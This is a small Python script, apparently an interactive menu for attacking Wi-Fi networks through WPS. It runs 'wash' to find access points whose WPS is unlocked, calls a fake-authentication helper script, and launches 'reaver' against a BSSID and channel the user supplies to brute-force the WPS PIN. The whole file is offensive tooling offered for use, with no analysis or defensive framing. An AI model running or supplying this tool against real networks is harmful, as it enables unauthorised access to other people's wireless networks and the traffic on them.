#!/usr/bin/env python3

import subprocess

def check_wps_lock(interface):
    subprocess.run(['wash', '--interface', interface])

def associate_fake_auth():
    print("Issuing warning to associate using fake authentication...")
    subprocess.run(['python3', 'fake-auth.py'])

def use_reaver():
    bssid = input("Enter the BSSID (MAC Address): ")
    channel = input("Enter the channel number: ")
    verbose = input("Do you want verbose output? (yes/no): ").lower()
    associate = input("Do you want to associate? (yes/no): ").lower()

    reaver_cmd = ['reaver', '--bssid', bssid, '--channel', channel]

    if verbose == 'yes':
        reaver_cmd.extend(['-vvv'])

    if associate not in ['yes', 'y']:
        reaver_cmd.extend(['--no-associate'])

    subprocess.run(reaver_cmd)

def main():
    print("********Run with sudo or with admin privileges********")
    print("Select an option:")
    print("1. Check WPS lock")
    print("2. Associate using fake authentication")
    print("3. Use Reaver to try all possible combinations")

    option = input()

    if option == '1':
        interface = input("Enter the interface name: ")
        check_wps_lock(interface)
    elif option == '2':
        associate_fake_auth()
    elif option == '3':
        use_reaver()
    else:
        print("Invalid option")

if __name__ == "__main__":
    main()
